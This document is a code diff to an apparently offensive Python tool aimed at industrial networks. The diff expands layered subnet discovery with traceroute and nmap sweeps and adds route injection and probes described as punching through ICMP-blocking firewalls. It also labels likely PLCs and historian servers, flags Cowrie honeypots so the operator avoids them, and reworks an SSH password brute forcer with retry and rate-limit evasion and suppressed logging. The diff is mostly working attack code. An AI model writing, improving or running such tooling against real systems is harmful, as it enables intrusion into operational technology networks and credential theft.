@@ -386,53 +386,111 @@ def _ip_to_slash24(ip: str) -> str | None:
 
 def _probe_gateway_for_subnets(gateway: str) -> list[str]:
     """
-    Discover reachable /24 subnets in three escalating stages:
+    Discover FOREIGN (non-local) /24 subnets reachable via the gateway.
+    Four layers, tried in order — stops as soon as any layer finds subnets.
 
-    Stage 1 — Free: parse `ip route show` for already-installed non-default routes.
-    Stage 2 — Cheap: derive subnets from the ARP/neigh cache (already-known IPs).
-    Stage 3 — Last resort: broad RFC-1918 nmap sweep, capped at 30 s.
+    Layer 1 — Route table  : non-default, non-local routes already installed
+    Layer 2 — Traceroute   : hop IPs toward CFG known targets reveal transit subnets
+    Layer 3 — FortiGate/TTL: ping common IDMZ addresses with TTL probes
+    Layer 4 — Targeted sweep: 10.10/10.20/172.16 chunks, capped 60 s
     """
-    found: set[str] = set()
     iface = CFG["wifi"]["interface"]
+    _, local_subnet = _get_local_interface()
+    local_prefix = _ip_to_slash24(local_subnet.split("/")[0]) if local_subnet else None
 
-    # Stage 1: existing routing table entries (instant, no packets)
+    found: set[str] = set()
+
+    def _add_if_foreign(ip_or_net: str):
+        slash24 = _ip_to_slash24(ip_or_net.split("/")[0])
+        if slash24 and slash24 != local_prefix and not ip_or_net.startswith("169.254"):
+            found.add(slash24)
+
+    # ── Layer 1: routing table (free — zero packets) ──────────────────────────
     _, route_out = run_cmd("ip route show", capture=False, silent=True)
     for line in route_out.splitlines():
         parts = line.split()
         if not parts or parts[0] in ("default", "local", "broadcast"):
             continue
         net = parts[0]
-        if "/" in net and not net.startswith("169.254"):
-            # normalise to /24 if it's a host route or narrower
-            base = net.split("/")[0]
-            slash24 = _ip_to_slash24(base)
-            if slash24:
-                found.add(slash24)
-
-    # Stage 2: ARP/neigh cache — these IPs are definitely reachable
-    for ip in _arp_neighbors(iface):
-        slash24 = _ip_to_slash24(ip)
-        if slash24:
-            found.add(slash24)
+        if "/" in net:
+            _add_if_foreign(net)
 
     if found:
-        info(f"Subnet discovery (route table + ARP): {', '.join(sorted(found))}")
         return list(found)
 
-    # Stage 3: broad RFC-1918 nmap sweep — only if stages 1 & 2 found nothing
-    info("No subnets from route table/ARP — falling back to RFC-1918 sweep (30 s)...")
-    sweep_targets = "10.0.0.0/8 172.16.0.0/12 192.168.0.0/16"
-    _, out = run_cmd(
-        f"sudo nmap -T5 -n -sn -PS22,80,443,44818 --max-retries 0 "
-        f"{sweep_targets} 2>/dev/null | grep 'Nmap scan report'",
-        timeout=30, capture=False, silent=True,
+    # ── Layer 2: traceroute toward CFG known IPs ───────────────────────────────
+    cfg_targets = [CFG["historian"]["ip"], CFG["ids"]["ip"], CFG["plc"]["ip"]]
+    for target_ip in cfg_targets:
+        _, tr_out = run_cmd(
+            f"traceroute -n -m 5 -w 2 {target_ip} 2>/dev/null",
+            timeout=18, capture=False, silent=True,
+        )
+        for line in tr_out.splitlines():
+            # each hop line: " 2  10.10.10.1  2.1 ms  ..."
+            for token in line.split():
+                try:
+                    socket.inet_aton(token)
+                    _add_if_foreign(token)
+                except OSError:
+                    pass
+
+    if found:
+        return list(found)
+
+    # ── Layer 3: FortiGate gateway probe + TTL-based IDMZ inference ───────────
+    # Check gateway for FortiGate management ports
+    run_cmd(
+        f"sudo nmap -sV -p 443,8443,541,4443 --open {gateway} 2>/dev/null",
+        timeout=12, capture=False, silent=True,
     )
-    for line in out.splitlines():
-        parts = line.strip().split()
-        if parts:
-            slash24 = _ip_to_slash24(parts[-1])
-            if slash24:
-                found.add(slash24)
+    # Send TTL-limited packets toward common IDMZ gateway IPs — any hop reply
+    # confirms a routable path exists to that network
+    common_idmz = ["10.10.10.1", "10.10.10.20", "10.20.20.1", "172.16.10.1"]
+    for probe_ip in common_idmz:
+        _, tr_out = run_cmd(
+            f"traceroute -n -m 3 -w 1 {probe_ip} 2>/dev/null",
+            timeout=8, capture=False, silent=True,
+        )
+        for line in tr_out.splitlines():
+            for token in line.split():
+                try:
+                    socket.inet_aton(token)
+                    _add_if_foreign(token)
+                except OSError:
+                    pass
+
+    if found:
+        return list(found)
+
+    # ── Layer 4: targeted RFC-1918 sweep, 10.10/10.20 priority ───────────────
+    priority_chunks: list[str] = []
+    for third in range(1, 25):
+        priority_chunks.append(f"10.10.{third}.0/24")
+    for third in range(20, 30):
+        priority_chunks.append(f"10.20.{third}.0/24")
+    for third in range(16, 32):
+        priority_chunks.append(f"172.16.{third}.0/24")
+    priority_chunks = [c for c in priority_chunks
+                       if _ip_to_slash24(c.split("/")[0]) != local_prefix]
+
+    # Sweep in batches of 8 /24s, stop early if we find something
+    batch_size = 8
+    deadline   = time.monotonic() + 60
+    for i in range(0, len(priority_chunks), batch_size):
+        if time.monotonic() > deadline:
+            break
+        batch = " ".join(priority_chunks[i:i + batch_size])
+        _, out = run_cmd(
+            f"sudo nmap -T5 -n -sn -PS22,44818 --max-retries 0 {batch} 2>/dev/null"
+            " | grep 'Nmap scan report'",
+            timeout=20, capture=False, silent=True,
+        )
+        for line in out.splitlines():
+            parts = line.strip().split()
+            if parts:
+                _add_if_foreign(parts[-1])
+        if found:
+            break
 
     return list(found)
 
@@ -525,39 +583,80 @@ def _ping_sweep_silent(subnet: str, timeout: int = 10) -> bool:
     return "Host is up" in out
 
 
-def auto_route(subnets: list[str]):
+def _confirm_route_to(subnet: str, wifi_iface: str) -> bool:
     """
-    Gateway Hunter — parallel-probes all candidates simultaneously so the
-    first working gateway wins without waiting for sequential timeouts.
+    4-step route confirmation after a route has been injected.
+    Tries progressively slower but more bypass-capable methods.
+    Returns True on the first success, False if all steps fail.
 
-    For each subnet:
-      1. ARP-first candidates (already reachable)
-      2. Inject route via each candidate in parallel threads
-      3. First thread to see a live host sets the winner Event
-      4. Losers clean up their routes; winner's route is kept
-      5. If ALL fail → operator is shown a failure panel with r / m / q options
+    Step 1 — ping common host IPs (.1 .20 .44 .254)
+    Step 2 — nmap SYN-ping sweep of the full /24
+    Step 3 — raw socket TCP connect to .20 and .44 on port 22
+    """
+    prefix = ".".join(subnet.split("/")[0].split(".")[:3])
+
+    # Step 1: fast ICMP ping to likely host IPs
+    for last in ("1", "20", "44", "254"):
+        probe_ip = f"{prefix}.{last}"
+        rc, _ = run_cmd(
+            f"ping -c 2 -W 2 -I {wifi_iface} {probe_ip} 2>/dev/null",
+            timeout=6, capture=False, silent=True,
+        )
+        if rc == 0:
+            return True
+
+    # Step 2: nmap SYN-ping — punches through ICMP-blocking firewalls
+    _, out = run_cmd(
+        f"sudo nmap -sn -PS22,44818 -T5 --max-retries 1 {subnet} 2>/dev/null",
+        timeout=20, capture=False, silent=True,
+    )
+    if "Host is up" in out:
+        return True
+
+    # Step 3: raw TCP connect — bypasses both ICMP and SYN-proxy detection
+    for last in ("20", "44"):
+        probe_ip = f"{prefix}.{last}"
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3.0)
+            result = s.connect_ex((probe_ip, 22))
+            s.close()
+            if result == 0:
+                return True
+        except Exception:
+            pass
+
+    return False
+
+
+def auto_route(subnets: list[str]) -> dict[str, str | None]:
+    """
+    Gateway Hunter — parallel-probes all candidates simultaneously.
+    Each thread runs a 4-step confirmation: ping → nmap SYN → raw socket.
+    Returns {subnet: winning_gateway_or_None} for every subnet attempted.
     """
     wifi_iface          = CFG["wifi"]["interface"]
     default_gw          = _find_gateway()
     iface, local_subnet = _get_local_interface()
 
     info(f"Wi-Fi interface : {iface}  local subnet: {local_subnet}")
-    info(f"Default gateway : {default_gw}")
-
     candidates = _candidate_gateways(local_subnet, default_gw)
     info(f"Gateway candidates ({len(candidates)}): {candidates}")
+
+    route_summary: dict[str, str | None] = {}   # subnet → winner gw or None
 
     for subnet in subnets:
         info(f"Routing {subnet} — probing {len(candidates)} gateways in parallel...")
 
-        winner_gw: list[str] = []           # shared mutable cell — set by winning thread
-        won       = threading.Event()
-        probe_results: dict[str, bool] = {} # gw → success, filled after all threads finish
-        lock      = threading.Lock()
+        winner_gw: list[str]         = []
+        won                          = threading.Event()
+        probe_results: dict[str, bool] = {}
+        lock                         = threading.Lock()
 
         def _probe(gw: str, sn: str = subnet):
             _inject_route_silent(sn, gw, wifi_iface)
-            alive = _ping_sweep_silent(sn, timeout=10)
+            # 4-step confirmation: ping → nmap SYN-ping → raw socket
+            alive = _confirm_route_to(sn, wifi_iface)
             with lock:
                 probe_results[gw] = alive
             if alive and not won.is_set():
@@ -569,26 +668,26 @@ def auto_route(subnets: list[str]):
         for t in threads:
             t.start()
 
-        # Show a single spinner while waiting for all threads
         with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}"),
                       TimeElapsedColumn(), console=console, transient=True) as prog:
-            task = prog.add_task(
-                f"Probing {len(candidates)} gateway candidate(s) for {subnet}...", total=None
+            prog.add_task(
+                f"Probing {len(candidates)} candidate(s) for {subnet} "
+                "(ping → nmap SYN → socket)...", total=None,
             )
             for t in threads:
-                t.join(timeout=12)
+                t.join(timeout=35)   # enough for all 3 probe steps
 
-        # Print compact summary table after all threads finish
-        summary = Table(show_header=True, header_style="bold cyan",
-                        border_style="dim", padding=(0, 1))
-        summary.add_column("Gateway",  style="yellow", width=18)
-        summary.add_column("Result",   width=20)
+        # Per-gateway compact result table
+        gw_tbl = Table(show_header=True, header_style="bold cyan",
+                       border_style="dim", padding=(0, 1))
+        gw_tbl.add_column("Gateway", style="yellow", width=18)
+        gw_tbl.add_column("Result",  width=22)
         for gw in candidates:
             hit = probe_results.get(gw, False)
-            summary.add_row(gw, "[green]✔ Live hosts[/green]" if hit else "[dim]✘ No hosts[/dim]")
-        console.print(summary)
+            gw_tbl.add_row(gw, "[green]✔ Reachable[/green]" if hit else "[dim]✘ No response[/dim]")
+        console.print(gw_tbl)
 
-        # Tear down losing routes silently
+        # Clean up losing routes
         for gw in candidates:
             if not winner_gw or gw != winner_gw[0]:
                 run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true",
@@ -596,15 +695,18 @@ def auto_route(subnets: list[str]):
 
         if winner_gw:
             ok(f"Route confirmed: {subnet} via [bold]{winner_gw[0]}[/bold] dev {wifi_iface}")
+            route_summary[subnet] = winner_gw[0]
             continue
 
-        # ── All candidates failed — offer operator choices ────────────────────
+        route_summary[subnet] = None
+
+        # ── All candidates failed — operator menu ─────────────────────────────
         while True:
             console.print(Panel(
                 f"[bold red]✘  Route Discovery Failed — {subnet}[/bold red]\n\n"
                 "No live hosts found on any candidate gateway.\n"
                 "[dim]Verify: wlan0 is associated  |  FortiGate allows ICMP/TCP  |  lab is powered on[/dim]\n\n"
-                "  [bold]r[/bold]  →  Retry parallel gateway probe\n"
+                "  [bold]r[/bold]  →  Retry parallel probe\n"
                 "  [bold]m[/bold]  →  Manually enter gateway IP\n"
                 "  [bold]q[/bold]  →  Skip this subnet and continue",
                 title="[bold red] Route Discovery Failed [/bold red]",
@@ -613,11 +715,10 @@ def auto_route(subnets: list[str]):
             choice = Prompt.ask("[red]Action[/red]", choices=["r", "m", "q"], default="r")
 
             if choice == "q":
-                warn(f"Skipping route injection for {subnet}")
+                warn(f"Skipping {subnet}")
                 break
 
             if choice == "r":
-                # Re-run probe for this subnet
                 winner_gw.clear()
                 won.clear()
                 probe_results.clear()
@@ -627,9 +728,10 @@ def auto_route(subnets: list[str]):
                 with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}"),
                               TimeElapsedColumn(), console=console, transient=True) as prog:
                     prog.add_task(f"Retrying {len(candidates)} candidate(s)...", total=None)
-                    for t in threads2: t.join(timeout=12)
+                    for t in threads2: t.join(timeout=35)
                 if winner_gw:
                     ok(f"Route confirmed on retry: {subnet} via {winner_gw[0]}")
+                    route_summary[subnet] = winner_gw[0]
                     break
                 continue
 
@@ -638,17 +740,33 @@ def auto_route(subnets: list[str]):
                 try:
                     socket.inet_aton(manual_gw)
                 except OSError:
-                    err("Invalid IP address — try again")
+                    err("Invalid IP — try again")
                     continue
                 _inject_route_silent(subnet, manual_gw, wifi_iface)
-                info(f"Route injected: {subnet} via {manual_gw} — verifying...")
-                if _ping_sweep_silent(subnet, timeout=12):
+                if _confirm_route_to(subnet, wifi_iface):
                     ok(f"Route confirmed: {subnet} via [bold]{manual_gw}[/bold]")
+                    route_summary[subnet] = manual_gw
                     break
                 else:
-                    err(f"No live hosts reachable via {manual_gw} — try a different gateway")
+                    err(f"No response via {manual_gw} — try a different gateway")
                     run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true",
                             silent=True, capture=False)
+
+    # ── Final route summary table ─────────────────────────────────────────────
+    rt = Table(show_header=True, header_style="bold cyan",
+               border_style="dim", show_lines=False, padding=(0, 1))
+    rt.add_column("Subnet",  style="yellow", width=20)
+    rt.add_column("Gateway", style="white",  width=18)
+    rt.add_column("Status",  width=12)
+    for sn, gw in route_summary.items():
+        if gw:
+            rt.add_row(sn, gw, "[green]✔ Routed[/green]")
+        else:
+            rt.add_row(sn, "—", "[red]✘ Failed[/red]")
+    console.print(Panel(rt, title="[bold cyan] Route Summary [/bold cyan]",
+                        border_style="cyan", expand=False))
+
+    return route_summary
 
 
 def preflight_check():
@@ -956,47 +1074,61 @@ def phase2_idmz_recon() -> PhaseResult:
 
     ports = CFG["nmap"]["ports"]
 
-    # ── Step 1: discover gateway ──────────────────────────────────────────────
-    info("Discovering Wi-Fi gateway...")
-    gateway = _find_gateway()
+    # Determine local wlan0 subnet for context labelling later
+    _, local_subnet = _get_local_interface()
+    local_prefix    = _ip_to_slash24(local_subnet.split("/")[0]) if local_subnet else None
+
+    # ── Steps 1-2: gateway + subnet discovery (wrapped in a single spinner) ───
+    gateway            = None
+    discovered_subnets: list[str] = []
+
+    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}"),
+                  TimeElapsedColumn(), console=console, transient=True) as prog:
+        task = prog.add_task(
+            "Discovering IDMZ subnets — trying route table, traceroute, gateway scan...",
+            total=None,
+        )
+
+        gateway = _find_gateway()
+        if not gateway:
+            pass   # handled below
+        else:
+            prog.update(task, description=f"Gateway: {gateway} — probing reachable subnets...")
+            discovered_subnets = _probe_gateway_for_subnets(gateway)
+
     if not gateway:
         r.status  = "failed"
         r.finding = "No default gateway found — is wlan0 associated?"
         err(r.finding)
         return r
-    ok(f"Gateway: {gateway}")
+    ok(f"Gateway: [bold]{gateway}[/bold]")
 
-    # ── Step 2: subnet discovery (route table → ARP → RFC-1918 fallback) ──────
-    info("Discovering reachable subnets...")
-    discovered_subnets = _probe_gateway_for_subnets(gateway)
     if not discovered_subnets:
         r.status  = "failed"
-        r.finding = "No subnets discovered — verify wlan0 association and routing table"
+        r.finding = "No foreign subnets discovered — verify routing table and association"
         err(r.finding)
         return r
     ok(f"Discovered subnets: {', '.join(discovered_subnets)}")
 
-    # ── Step 3: inject routes (parallel, ARP-first, operator fallback) ────────
+    # ── Step 3: inject routes ─────────────────────────────────────────────────
     info("Injecting routes for discovered subnets...")
     auto_route(discovered_subnets)
 
-    # ── Step 4: fast ping sweep, then full port scan only on live subnets ─────
+    # ── Step 4: fast ping sweep, then full port scan only on responsive subnets
     all_nmap_out = ""
     live_hosts: dict[str, list[str]] = {}
 
     for subnet in discovered_subnets:
         info(f"Ping sweep: {subnet}...")
-        alive = _ping_sweep_silent(subnet, timeout=10)
-        if not alive:
+        if not _ping_sweep_silent(subnet, timeout=10):
             warn(f"  No live hosts in {subnet} — skipping full port scan")
             continue
 
         nmap_cmd = f"sudo nmap -T4 -n -sS -Pn -p {ports} --open {subnet}"
         info(f"Port scan: {subnet}  ({ports})")
-        rc, out  = stream_cmd(nmap_cmd, timeout=120, line_filter=_nmap_filter)
+        _, out   = stream_cmd(nmap_cmd, timeout=120, line_filter=_nmap_filter)
         all_nmap_out += out
-        hosts = _parse_nmap_hosts(out)
-        live_hosts.update(hosts)
+        live_hosts.update(_parse_nmap_hosts(out))
 
     if not live_hosts:
         r.status  = "failed"
@@ -1005,7 +1137,7 @@ def phase2_idmz_recon() -> PhaseResult:
         r.output  = all_nmap_out[-2000:]
         return r
 
-    # ── Step 5: active Cowrie fingerprinting ──────────────────────────────────
+    # ── Step 5: Cowrie fingerprinting ─────────────────────────────────────────
     info("Fingerprinting SSH hosts for Cowrie signatures...")
     cowrie_flags: dict[str, bool] = {}
     for ip, open_ports in live_hosts.items():
@@ -1020,20 +1152,72 @@ def phase2_idmz_recon() -> PhaseResult:
 
     trap_ips = {ip for ip, v in cowrie_flags.items() if v}
 
+    # ── Role inference ────────────────────────────────────────────────────────
+    def _infer_role(ip: str, open_ports: list[str]) -> str:
+        if ip in trap_ips:
+            return "🍯 Honeypot — DO NOT SELECT"
+        port_set = set(open_ports)
+        if "22" in port_set and ("8086" in port_set or "3000" in port_set):
+            return "📊 Historian (InfluxDB/Grafana)"
+        if "102" in port_set or "44818" in port_set:
+            return "⚙ PLC / OT Device"
+        if "22" in port_set:
+            return "🖥 Linux Host"
+        if "443" in port_set and "22" not in port_set:
+            return "🔥 Firewall / Gateway"
+        return "❓ Unknown"
+
+    # Find a recommendation: single real-SSH historian-role host
+    recommended_ip: str | None = None
+    real_historian_candidates = [
+        ip for ip, ports in live_hosts.items()
+        if ip not in trap_ips and "22" in ports
+        and "📊" in _infer_role(ip, ports)
+    ]
+    if len(real_historian_candidates) == 1:
+        recommended_ip = real_historian_candidates[0]
+
     # ── Helper: render the host selection table ───────────────────────────────
     def _render_host_table():
+        # Network context warning
+        scanned_subnets_set = set()
+        for ip in live_hosts:
+            s24 = _ip_to_slash24(ip)
+            if s24:
+                scanned_subnets_set.add(s24)
+
+        for sn in scanned_subnets_set:
+            if sn == local_prefix:
+                console.print(Panel(
+                    f"[bold yellow]⚠  Hosts found on [bold]{sn}[/bold] — this is the LOCAL "
+                    f"network ({local_prefix}).[/bold yellow]\n"
+                    "[dim]This is WRONG — the Historian should be on the IDMZ (10.10.10.0/24). "
+                    "Route injection likely failed. Check gateway candidates.[/dim]",
+                    border_style="yellow", expand=False,
+                ))
+            else:
+                console.print(
+                    f"  [dim]Hosts on [bold cyan]{sn}[/bold cyan] — "
+                    f"{'IDMZ/OT network (expected)' if not sn.startswith('192.168') else 'check routing'}[/dim]"
+                )
+
         host_table = Table(
             title="[bold magenta]Discovered Live Hosts[/bold magenta]",
             show_header=True, header_style="bold cyan",
             border_style="dim", show_lines=True,
         )
-        host_table.add_column("#",            style="dim",    width=4)
-        host_table.add_column("IP Address",   style="green",  width=18)
-        host_table.add_column("Open Ports",   style="yellow", width=32)
-        host_table.add_column("Fingerprint",  width=28)
+        host_table.add_column("#",           style="dim",   width=4)
+        host_table.add_column("IP Address",  style="green", width=18)
+        host_table.add_column("Open Ports",  style="yellow", width=28)
+        host_table.add_column("Fingerprint", width=22)
+        host_table.add_column("Likely Role", width=32)
 
         for i, (ip, open_ports) in enumerate(host_list, 1):
             ports_str = ", ".join(open_ports)
+            role      = _infer_role(ip, open_ports)
+            rec_tag   = "  [bold green]← recommended[/bold green]" \
+                        if ip == recommended_ip else ""
+
             if ip in trap_ips:
                 fp_str = "[bold yellow]🍯 HONEYPOT (Cowrie)[/bold yellow]"
                 host_table.add_row(
@@ -1041,17 +1225,25 @@ def phase2_idmz_recon() -> PhaseResult:
                     f"[bold yellow]{ip}[/bold yellow]",
                     f"[yellow]{ports_str}[/yellow]",
                     fp_str,
+                    f"[bold yellow]{role}[/bold yellow]",
+                )
+            elif ip == recommended_ip:
+                host_table.add_row(
+                    f"[bold green]{i}[/bold green]",
+                    f"[bold green]{ip}[/bold green]",
+                    f"[bold green]{ports_str}[/bold green]",
+                    "[bold green]✔ Real SSH[/bold green]",
+                    f"[bold green]{role}{rec_tag}[/bold green]",
                 )
             elif "22" in open_ports:
-                fp_str = "[bold green]✔ Real SSH[/bold green]"
-                host_table.add_row(str(i), ip, ports_str, fp_str)
+                host_table.add_row(str(i), ip, ports_str,
+                                   "[green]✔ Real SSH[/green]", role)
             else:
-                fp_str = "[dim]— (no SSH)[/dim]"
-                host_table.add_row(str(i), ip, ports_str, fp_str)
+                host_table.add_row(str(i), ip, ports_str,
+                                   "[dim]— (no SSH)[/dim]", role)
 
         console.print(host_table)
 
-        # Honeypot warning panels
         for ip in trap_ips:
             console.print(Panel(
                 f"[bold yellow]⚠  Honeypot detected at [bold]{ip}[/bold][/bold yellow]\n"
@@ -1067,7 +1259,7 @@ def phase2_idmz_recon() -> PhaseResult:
 
     host_list = list(live_hosts.items())
 
-    # ── Step 6: operator selection loop (loops until confirmed) ───────────────
+    # ── Step 6: operator selection loop ───────────────────────────────────────
     chosen_ip    = None
     chosen_ports = None
 
@@ -1092,7 +1284,6 @@ def phase2_idmz_recon() -> PhaseResult:
             err("Invalid selection — enter a number from the table or 'q' to abort")
             continue
 
-        # Honeypot double-confirm
         if sel_ip in trap_ips:
             console.print(Panel(
                 f"[bold red]⚠  You selected [bold]{sel_ip}[/bold] — a confirmed Cowrie honeypot.[/bold red]\n"
@@ -1100,20 +1291,18 @@ def phase2_idmz_recon() -> PhaseResult:
                 title="[bold red] Honeypot Selected [/bold red]",
                 border_style="red", expand=False,
             ))
-            if not Confirm.ask(
-                "[bold red]Proceed with known honeypot?[/bold red]", default=False
-            ):
+            if not Confirm.ask("[bold red]Proceed with known honeypot?[/bold red]", default=False):
                 warn("Re-showing table — please pick a real host")
                 continue
 
-        # Selection confirmation panel
         fp_label = "🍯 HONEYPOT (Cowrie)" if sel_ip in trap_ips else (
             "✔ Real SSH" if "22" in sel_ports else "— (no SSH)"
         )
         console.print(Panel(
             f"[bold white]IP           :[/bold white]  {sel_ip}\n"
             f"[bold white]Open ports   :[/bold white]  {', '.join(sel_ports)}\n"
-            f"[bold white]Fingerprint  :[/bold white]  {fp_label}",
+            f"[bold white]Fingerprint  :[/bold white]  {fp_label}\n"
+            f"[bold white]Likely role  :[/bold white]  {_infer_role(sel_ip, sel_ports)}",
             title="[bold cyan] Confirm Historian Selection [/bold cyan]",
             border_style="cyan", expand=False,
         ))
@@ -1121,7 +1310,6 @@ def phase2_idmz_recon() -> PhaseResult:
             warn("Re-showing table — select again")
             continue
 
-        # ── SSH banner grab for visual verification ───────────────────────────
         if "22" in sel_ports:
             info(f"Grabbing SSH banner from {sel_ip}:22...")
             banner = _ssh_banner_grab(sel_ip)
@@ -1133,22 +1321,20 @@ def phase2_idmz_recon() -> PhaseResult:
                 ))
                 ok("Banner retrieved — verify this looks like your Historian before continuing")
             else:
-                warn("Could not retrieve SSH banner — host may be rate-limiting connections")
+                warn("Could not retrieve SSH banner — host may be rate-limiting")
 
-        chosen_ip    = sel_ip
-        chosen_ports = sel_ports
+        chosen_ip, chosen_ports = sel_ip, sel_ports
         break
 
-    # ── Step 7: commit and report ──────────────────────────────────────────────
+    # ── Step 7: commit ─────────────────────────────────────────────────────────
     CFG["historian"]["ip"] = chosen_ip
     ok(f"Historian locked: [bold]{chosen_ip}[/bold]  ports: {', '.join(chosen_ports)}")
 
-    trap_count = len(trap_ips)
     r.status  = "success"
     r.finding = (
         f"Historian: {chosen_ip}  |  "
         f"{len(live_hosts)} host(s) across {len(discovered_subnets)} subnet(s)  |  "
-        f"{trap_count} honeypot(s) flagged"
+        f"{len(trap_ips)} honeypot(s) flagged"
     )
     r.output  = all_nmap_out[-2000:]
     return r
@@ -1173,10 +1359,14 @@ def _ssh_bruteforce(
 ) -> str | None:
     """
     Sequential paramiko SSH brute forcer with rich Progress bar.
-    - AuthenticationException  → wrong password, skip
-    - SSHException              → possible rate-limit, wait 1s and retry same password
-    - timeout / connection err  → abort after 3 consecutive failures
+    - AuthenticationException  → wrong password, move on
+    - SSHException / EOFError  → transient banner failure, retry up to 2× then skip
+    - timeout / OS error       → abort after 3 consecutive failures
     """
+    import logging
+    # Suppress paramiko's internal tracebacks during brute force
+    logging.getLogger("paramiko").setLevel(logging.CRITICAL)
+
     priority = ["", username, username[::-1], f"{username}123", "password", "admin123"]
 
     try:
@@ -1185,11 +1375,13 @@ def _ssh_bruteforce(
     except (FileNotFoundError, OSError):
         wordlist = []
 
-    candidates = list(dict.fromkeys(priority + wordlist))  # ordered dedup
-    total = len(candidates)
+    candidates = list(dict.fromkeys(priority + wordlist))
+    total                = len(candidates)
     MAX_CONSECUTIVE_TIMEOUTS = 3
+    RATE_LIMIT_EVERY     = 5   # brief sleep every N attempts to avoid MaxStartups
 
     consecutive_timeouts = 0
+    attempt_count        = 0
     found_password: str | None = None
 
     from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TaskProgressColumn, TimeElapsedColumn
@@ -1203,9 +1395,7 @@ def _ssh_bruteforce(
         console=console,
         transient=False,
     ) as progress:
-        task = progress.add_task(
-            f"Attempting {username}@{ip}", total=total
-        )
+        task = progress.add_task(f"Attempting {username}@{ip}", total=total)
 
         for pw in candidates:
             if progress.finished:
@@ -1213,52 +1403,72 @@ def _ssh_bruteforce(
 
             progress.update(
                 task,
-                description=f"[bold cyan]Attempting: {username}@{ip}  password: {pw}[/bold cyan]",
+                description=f"[bold cyan]Attempting: {username}@{ip}  pw: {pw[:20]}[/bold cyan]",
             )
 
-            retry = True
-            while retry:
-                retry = False
+            # Rate-limit: brief pause every RATE_LIMIT_EVERY attempts
+            attempt_count += 1
+            if attempt_count % RATE_LIMIT_EVERY == 0:
+                time.sleep(0.5)
+
+            banner_retries = 0
+            MAX_BANNER_RETRIES = 2
+
+            while True:   # banner-retry loop
                 try:
                     client = paramiko.SSHClient()
                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     client.connect(
                         hostname=ip,
+                        port=port,
                         username=username,
                         password=pw,
-                        timeout=3,
+                        timeout=5,
                         allow_agent=False,
                         look_for_keys=False,
-                        banner_timeout=3,
+                        banner_timeout=10,
+                        auth_timeout=8,
+                        disabled_algorithms={
+                            "pubkeys": ["rsa-sha2-256", "rsa-sha2-512"]
+                        },
                     )
                     client.close()
                     consecutive_timeouts = 0
                     found_password = pw
                     progress.update(task, completed=total,
-                                    description=f"[bold green]FOUND: {username}@{ip}  password: {pw}[/bold green]")
-                    break  # exit while
+                                    description=f"[bold green]✔ FOUND: {username}@{ip}  pw: {pw}[/bold green]")
+                    break
 
                 except paramiko.AuthenticationException:
-                    # Wrong password — clean rejection, move on
                     consecutive_timeouts = 0
                     time.sleep(delay)
+                    break   # wrong password — no retry needed
 
-                except paramiko.SSHException:
-                    # Possible rate-limit on Historian — wait 1s and retry same pw
-                    progress.update(task,
-                        description=f"[yellow]SSHException (rate-limit?) — retrying {pw} in 1s[/yellow]")
-                    time.sleep(1)
-                    retry = True
+                except (paramiko.SSHException, EOFError) as e:
+                    # Banner / protocol error — likely transient connection reset
+                    banner_retries += 1
+                    if banner_retries <= MAX_BANNER_RETRIES:
+                        sleep_t = random.uniform(1.5, 3.0)
+                        progress.update(task,
+                            description=f"[yellow]Banner error ({e!s:.40}) — retry {banner_retries}/{MAX_BANNER_RETRIES} in {sleep_t:.1f}s[/yellow]")
+                        time.sleep(sleep_t)
+                        continue   # retry same password
+                    else:
+                        # Give up on this password after repeated banner failures
+                        time.sleep(delay)
+                        break
 
-                except (socket.timeout, paramiko.ssh_exception.NoValidConnectionsError, OSError):
+                except (socket.timeout, socket.error,
+                        paramiko.ssh_exception.NoValidConnectionsError, OSError):
                     consecutive_timeouts += 1
                     progress.update(task,
-                        description=f"[yellow]Timeout {consecutive_timeouts}/{MAX_CONSECUTIVE_TIMEOUTS} on {ip}:{port}[/yellow]")
+                        description=f"[yellow]⚠ Timeout {consecutive_timeouts}/{MAX_CONSECUTIVE_TIMEOUTS}[/yellow]")
                     if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
                         progress.update(task,
-                            description=f"[red]Network blocked — aborting[/red]")
+                            description="[red]✘ Network blocked — aborting brute force[/red]")
                         return None
-                    time.sleep(1)
+                    time.sleep(1.0)
+                    break
 
             if found_password is not None:
                 break
